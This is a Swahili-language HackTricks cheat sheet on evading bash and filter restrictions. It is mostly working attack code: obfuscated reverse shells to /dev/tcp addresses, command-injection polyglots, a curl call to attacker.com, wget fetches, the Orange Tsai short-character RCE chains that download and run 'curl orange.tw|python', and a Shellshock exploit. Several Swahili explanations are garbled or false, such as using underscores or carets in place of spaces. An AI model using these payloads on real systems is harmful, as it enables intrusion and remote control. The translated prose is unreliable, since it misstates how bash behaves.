# Kuepuka Vizuizi vya Linux

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii za **kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Kuepuka Kikomo cha Kawaida

### Kitanzi cha Reverse
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell Fupi ya Kurejesha Udhibiti

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Hii ni amri ya kushikilia udhibiti wa kijijini kwa kutumia shell fupi. Inatumia mbinu ya redirection kuelekeza matokeo ya amri kwenye soketi ya TCP kwenye anwani ya IP 10.0.0.1 na bandari 8080. Hii inaruhusu mtumiaji kudhibiti mfumo wa lengo kutoka kwa kijijini.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Pita njia na maneno yaliyokatazwa

Kuna njia kadhaa za kuzunguka vizuizi vya njia na maneno yaliyokatazwa katika mazingira ya Bash. Hapa kuna mbinu kadhaa za kufanya hivyo:

#### 1. Matumizi ya alama ya backslash

Unaweza kutumia alama ya backslash (\) kabla ya kila herufi ya kipekee katika njia au neno lililokatazwa. Hii itasababisha Bash kuchukulia herufi hizo kama sehemu ya njia au neno na hivyo kuzunguka vizuizi.

Kwa mfano, badala ya kutumia njia ya /etc/passwd ambayo inaweza kuwa imezuiliwa, unaweza kutumia njia ya \/etc\/passwd.

#### 2. Matumizi ya alama ya kusimama

Unaweza kutumia alama ya kusimama (~) kama njia ya kuzunguka vizuizi vya njia. Alama ya kusimama inawakilisha nyumbani kwa mtumiaji na inaweza kutumika kama njia ya kurejelea nyumbani.

Kwa mfano, badala ya kutumia njia ya /etc/passwd, unaweza kutumia njia ya ~/etc/passwd.

#### 3. Matumizi ya alama ya asterisk

Unaweza kutumia alama ya asterisk (*) kama njia ya kuzunguka vizuizi vya njia. Alama ya asterisk inawakilisha wahusika wowote na inaweza kutumika kama njia ya kurejelea njia zingine.

Kwa mfano, badala ya kutumia njia ya /etc/passwd, unaweza kutumia njia ya /e*t/pa*d.

#### 4. Matumizi ya alama ya kurudisha

Unaweza kutumia alama ya kurudisha (~) kama njia ya kuzunguka vizuizi vya maneno yaliyokatazwa. Alama ya kurudisha inawakilisha nafasi tupu na inaweza kutumika kama njia ya kuepuka maneno yaliyokatazwa.

Kwa mfano, badala ya kutumia neno lililokatazwa "password", unaweza kutumia neno "pa ss wo rd".

Kumbuka kuwa mbinu hizi zinaweza kutofanya kazi katika mazingira fulani au kwa vizuizi vya ngazi ya juu. Ni muhimu kuelewa vizuri mazingira yako na kufanya majaribio kabla ya kutumia mbinu hizi.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Pita nafasi zilizozuiwa

Kuna njia kadhaa za kuzunguka vikwazo vya nafasi zilizozuiwa katika Bash. Hapa kuna mbinu kadhaa:

1. Matumizi ya alama ya backslash: Unaweza kutumia alama ya backslash (\) kabla ya nafasi ili kuzunguka kizuizi. Kwa mfano, badala ya kuandika `cd Documents`, unaweza kuandika `cd\ Documents`.

2. Matumizi ya alama ya mstari wa chini: Unaweza pia kutumia alama ya mstari wa chini (_) badala ya nafasi. Kwa mfano, badala ya kuandika `ls -l`, unaweza kuandika `ls_-l`.

3. Matumizi ya alama ya mstari wa juu: Unaweza kutumia alama ya mstari wa juu (^) badala ya nafasi. Kwa mfano, badala ya kuandika `nano my_file.txt`, unaweza kuandika `nano^my_file.txt`.

4. Matumizi ya alama ya mstari wa wima: Unaweza kutumia alama ya mstari wa wima (|) badala ya nafasi. Kwa mfano, badala ya kuandika `cat my_file.txt`, unaweza kuandika `cat|my_file.txt`.

5. Matumizi ya alama ya mstari wa kushoto: Unaweza kutumia alama ya mstari wa kushoto (<) badala ya nafasi. Kwa mfano, badala ya kuandika `grep "pattern" my_file.txt`, unaweza kuandika `grep_"pattern"_<my_file.txt`.

Kumbuka kuwa mbinu hizi zinaweza kutofanya kazi katika mazingira fulani au kwa mipangilio maalum ya usalama. Ni muhimu kuzingatia sheria na sera za usalama zilizowekwa katika mfumo husika.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Pita kizuizi cha backslash na slash

Kuna njia kadhaa za kuzunguka kizuizi cha backslash na slash katika mazingira ya Bash. Hapa kuna njia mbili za kufanya hivyo:

1. Matumizi ya heredoc: Unaweza kutumia heredoc kwa kuingiza maandishi yako ndani ya delimiter. Hii inaruhusu matumizi ya backslash na slash bila kuingiliwa na Bash. Hapa kuna mfano wa jinsi ya kutumia heredoc:

```bash
cat <<EOF
Maandishi yako hapa
EOF
```

2. Matumizi ya single quotes: Unaweza kutumia single quotes (' ') badala ya double quotes (" ") ili kuzunguka maandishi yako. Hii inafanya Bash isichukue umuhimu wa backslash na slash. Hapa kuna mfano wa jinsi ya kutumia single quotes:

```bash
echo 'Maandishi yako hapa'
```

Kwa kutumia njia hizi, unaweza kuzunguka kizuizi cha backslash na slash na kuendelea na shughuli zako za kuhack.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Pita mabomba

Unapojaribu kubadilisha amri ya bash kwa kutumia mabomba, unaweza kukutana na vizuizi ambavyo vinazuia matumizi ya mabomba. Hapa kuna njia kadhaa za kuzunguka vizuizi hivyo:

1. Kutumia amri ya `sh` badala ya `bash`: Badala ya kutumia `bash`, unaweza kutumia amri ya `sh` ambayo inaweza kuzunguka vizuizi vya mabomba.

2. Kutumia amri ya `zsh` badala ya `bash`: Ikiwa `sh` haifanyi kazi, unaweza kujaribu kutumia amri ya `zsh` ambayo pia inaweza kuzunguka vizuizi vya mabomba.

3. Kuficha mabomba na heredoc: Unaweza kuficha mabomba kwa kutumia heredoc. Kwa mfano, badala ya kutumia `echo "command | othercommand"`, unaweza kutumia `echo <<EOF command | othercommand EOF`.

4. Kutumia amri ya `eval`: Amri ya `eval` inaweza kutumika kutekeleza amri zilizopitishwa kupitia mabomba. Kwa mfano, unaweza kutumia `eval "command | othercommand"`.

5. Kutumia amri ya `script`: Amri ya `script` inaweza kutumika kurekodi na kutekeleza amri zilizopitishwa kupitia mabomba. Kwa mfano, unaweza kutumia `script -c "command | othercommand"`.

Kwa kuzingatia njia hizi, unaweza kuzunguka vizuizi vya mabomba na kuendelea na mchakato wako wa kubadilisha amri ya bash.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Kupita kwa kutumia uendeshaji wa hex

Kuna njia ya kuzunguka vizuizi vya bash kwa kutumia uendeshaji wa hex. Hii inaruhusu mtumiaji kuingiza amri ambazo zinaweza kuzuiwa na vizuizi vya bash.

Kwa kufanya hivyo, unahitaji kubadilisha amri ya bash kuwa uendeshaji wa hex. Unaweza kutumia amri ya `echo -e` kufanya hivyo. Hapa kuna hatua za kufuata:

1. Tafuta amri ambayo unataka kutekeleza, lakini inazuiliwa na vizuizi vya bash.
2. Badilisha kila herufi katika amri hiyo kuwa uendeshaji wa hex. Unaweza kutumia amri ya `printf` kufanya hivyo. Kwa mfano, ikiwa herufi ni 'a', unaweza kuiweka kama '\x61'.
3. Tumia amri ya `echo -e` kuonyesha amri iliyobadilishwa. Kwa mfano, ikiwa amri iliyobadilishwa ni '\x61\x62\x63', unaweza kutumia amri `echo -e "\x61\x62\x63"`.

Kwa kufuata hatua hizi, unaweza kuzunguka vizuizi vya bash na kutekeleza amri ambazo zinaweza kuwa zimezuiliwa hapo awali.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Pita kizuizi cha IPs

Kuna njia kadhaa za kuzunguka kizuizi cha IPs na kupata ufikiaji usiozuiliwa kwenye mtandao. Hapa kuna mbinu kadhaa za kufanya hivyo:

1. **Kutumia VPN**: Kutumia mtandao binafsi wa kibinafsi (VPN) inaweza kukusaidia kubadilisha anwani yako ya IP na kuonekana kama unatoka kwenye eneo lingine. Hii inaweza kukuruhusu kuzunguka kizuizi cha IPs na kupata ufikiaji usiozuiliwa.

2. **Kutumia Proxies**: Proxies ni seva zinazofanya kama mpatanishi kati ya kifaa chako na mtandao. Kwa kutumia proxy, unaweza kubadilisha anwani yako ya IP na kuonekana kama unatoka kwenye eneo lingine. Hii inaweza kukuruhusu kuzunguka kizuizi cha IPs na kupata ufikiaji usiozuiliwa.

3. **Kutumia Tor**: Tor ni mtandao wa kibinafsi ambao unaweza kutumia kuzunguka kizuizi cha IPs. Tor huficha anwani yako ya IP na kuirudisha kupitia seva nyingi za kati, kufanya iwe ngumu kufuatilia asili ya trafiki yako. Hii inaweza kukuruhusu kupata ufikiaji usiozuiliwa kwenye mtandao.

4. **Kutumia SSH Tunneling**: SSH tunneling inaruhusu kujenga njia salama ya kupeleka trafiki yako kupitia seva ya kati. Unaweza kutumia SSH tunneling kuzunguka kizuizi cha IPs na kupata ufikiaji usiozuiliwa.

5. **Kutumia DNS Tunneling**: DNS tunneling inaruhusu kuficha trafiki yako ndani ya mawasiliano ya DNS. Unaweza kutumia DNS tunneling kuzunguka kizuizi cha IPs na kupata ufikiaji usiozuiliwa.

Kumbuka kwamba kuzunguka kizuizi cha IPs inaweza kuwa kinyume cha sheria au kukiuka sera za mtandao. Hakikisha kufuata sheria na sera zinazohusiana na matumizi ya mtandao kabla ya kujaribu kuzunguka kizuizi cha IPs.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Uchukuzi wa Data kulingana na Wakati

Kuna njia nyingi za kuchukua data kutoka kwenye mfumo uliokithiri wa usalama. Moja ya njia hizo ni uchukuzi wa data kulingana na wakati. Njia hii inahusisha kutumia mbinu za kuchelewesha muda ili kuhamisha data nje ya mfumo bila kugunduliwa.

Kuna zana nyingi zinazopatikana ambazo zinaweza kutumika kutekeleza uchukuzi wa data kulingana na wakati. Moja ya zana hizo ni "sleep" ambayo inaweza kutumika kuchelewesha muda kati ya hatua za uchukuzi wa data. Kwa mfano, unaweza kutumia amri ya "sleep" ili kuchelewesha muda kabla ya kila hatua ya uchukuzi wa data ili kuficha shughuli zako.

Ni muhimu kuzingatia kwamba uchukuzi wa data kulingana na wakati unaweza kuwa polepole sana, haswa kwa data kubwa. Hii ni kwa sababu muda wa kuchelewesha unaweza kuwa mrefu sana ili kuepuka kugunduliwa. Hata hivyo, njia hii inaweza kuwa na ufanisi ikiwa unataka kuchukua data ndogo na usiwe na haraka sana.

Ni muhimu pia kuzingatia kwamba uchukuzi wa data kulingana na wakati unaweza kuwa hatari sana ikiwa utagunduliwa. Kwa hivyo, ni muhimu kuchukua tahadhari za kutosha na kufanya uchunguzi wa kina wa mfumo wako ili kuhakikisha kuwa hatua zako za uchukuzi wa data hazigunduliwi.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Kupata herufi kutoka kwa Mazingira ya Variables

Unaweza kupata herufi kutoka kwa mazingira ya variables kwa kutumia amri ya `echo` na kuchanganya na kamba ya bash. Hapa kuna njia mbili za kufanya hivyo:

1. Kwa kutumia kamba ya bash:
```bash
$ echo ${ENV_VARIABLE:POSITION:LENGTH}
```
Badilisha `ENV_VARIABLE` na jina la mazingira ya variable unayotaka kuchunguza. Badilisha `POSITION` na nafasi ya kuanzia ya herufi unayotaka kupata, na `LENGTH` na urefu wa herufi unayotaka kupata.

2. Kwa kutumia amri ya `cut`:
```bash
$ echo $ENV_VARIABLE | cut -c POSITION-POSITION+LENGTH
```
Badilisha `ENV_VARIABLE` na jina la mazingira ya variable unayotaka kuchunguza. Badilisha `POSITION` na nafasi ya kuanzia ya herufi unayotaka kupata, na `LENGTH` na urefu wa herufi unayotaka kupata.

Kwa njia zote mbili, utapata herufi zilizotolewa kutoka kwa mazingira ya variables.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Uchunguzi wa data ya DNS

Unaweza kutumia **burpcollab** au [**pingb**](http://pingb.in) kwa mfano.

### Zilizojengwa

Ikiwa huwezi kutekeleza kazi za nje na una ufikiaji tu kwa **seti ndogo ya zilizojengwa kupata RCE**, kuna mbinu muhimu za kufanya hivyo. Kawaida huwezi kutumia **zote** za **zilizojengwa**, kwa hivyo unapaswa **kujua chaguzi zako zote** kujaribu kuepuka kizuizi. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
Kwanza kabisa, angalia zote [**zilizojengwa za kifaa cha kabati**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Kisha hapa una baadhi ya **mapendekezo**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Uingizaji wa Amri ya Polyglot

Polyglot command injection ni mbinu ya kudukua ambapo mtumiaji anajaribu kuingiza amri za shell kwenye mfumo ambao unazuia amri za shell. Mbinu hii inatumia lugha nyingi (polyglot) ili kudanganya mfumo na kufanikiwa kutekeleza amri za shell.

Kwa kawaida, mfumo unaweza kuzuia amri za shell kwa kufunga herufi maalum au kuchuja alama za kawaida za amri za shell. Hata hivyo, kwa kutumia polyglot command injection, mtumiaji anaweza kudanganya mfumo kwa kutumia alama ambazo zinaonekana kuwa salama katika lugha nyingine, lakini bado zinafanya kazi kama amri za shell.

Mfano wa polyglot command injection ni kama ifuatavyo:

```bash
'; ls #'
```

Katika mfano huu, alama za kawaida za amri ya shell kama vile herufi, nukta, na mabano zimezuiliwa. Hata hivyo, kwa kutumia alama ya single quote ('), mtumiaji anaweza kudanganya mfumo na kuingiza amri ya shell "ls" ambayo itatekelezwa.

Ni muhimu kuzingatia kuwa polyglot command injection inaweza kuwa hatari na inaweza kusababisha madhara makubwa kwa mfumo. Ni muhimu kufanya ukaguzi wa usalama wa kina na kutekeleza hatua za kuzuia ili kuepuka mashambulizi ya aina hii.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Pita mifano ya regex

Ili kuepuka mifano ya regex inayowezekana
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator ni chombo cha kuficha au kubadilisha namna ya msimbo wa Bash ili kuepuka kugunduliwa na zana za uchunguzi. Inatumia mbinu mbalimbali za kuficha msimbo, kama vile kubadilisha majina ya pembejeo na pato, kuchanganya msimbo na kuongeza maoni ya uwongo. Hii inafanya iwe ngumu kwa wachunguzi kuelewa na kuchambua msimbo wa Bash uliofichwa. Bashfuscator inaweza kutumika kwa madhumuni ya kujifunza au kwa shughuli za uchunguzi wa usalama.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE na 5 herufi

Kuna njia ya kutekeleza Remote Code Execution (RCE) kwa kutumia herufi 5 tu. Hii ni njia ya kuvutia ya kuzunguka vizuizi vya Bash na kutekeleza msimbo wa mbali.

Njia hii inatumia amri ya `echo` na mchanganyiko wa herufi za kipekee kufikia RCE. Hapa kuna mfano wa jinsi ya kufanya hivyo:

```bash
echo${IFS}"<bash_command>"|sh
```

Badala ya `<bash_command>`, unaweza kuweka amri yoyote ya Bash ambayo unataka kutekeleza. Kwa mfano, unaweza kutumia:

```bash
echo${IFS}"$(id)"|sh
```

Hii itatekeleza amri ya `id` na kutoa matokeo yake.

Ni muhimu kutambua kuwa njia hii inaweza kubadilika kulingana na mazingira ya mfumo na vizuizi vilivyowekwa. Inashauriwa kufanya majaribio na kubadilisha njia hii ili kufikia RCE kwenye mazingira yako maalum.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE na 4 herufi

Kuna njia ya kufanya Remote Code Execution (RCE) kwa kutumia herufi 4 tu. Hii inawezekana kwa sababu ya udhaifu katika mfumo wa bash. Kwa kufuata hatua zifuatazo, unaweza kufanikisha RCE kwa kutumia herufi 4 tu.

1. Tumia amri ifuatayo kubaini ikiwa mfumo wako una udhaifu huu:
```bash
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```
Ikiwa utaona ujumbe "vulnerable", basi mfumo wako una udhaifu huu.

2. Tumia amri ifuatayo kufanya RCE:
```bash
env x='() { :;}; command_here' bash -c "echo this is a test"
```
Badilisha "command_here" na amri unayotaka kutekeleza kwenye mfumo.

Kwa kufuata hatua hizi, unaweza kufanikisha RCE kwa kutumia herufi 4 tu. Hii ni njia hatari na inapaswa kutumiwa kwa madhumuni ya kujifunza na kuboresha usalama wa mfumo wako.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Kusoma tu/Sioexec/Distroless Kupita

Ikiwa uko ndani ya mfumo wa faili na **ulinzi wa kusoma tu na sioexec** au hata katika chombo cha distroless, bado kuna njia za **kutekeleza programu za kibinadamu, hata kabisa!:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Kusambaratisha Chroot na Jela Nyingine

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Marejeo na Zaidi

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia kiotomatiki** zana za jamii za **juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
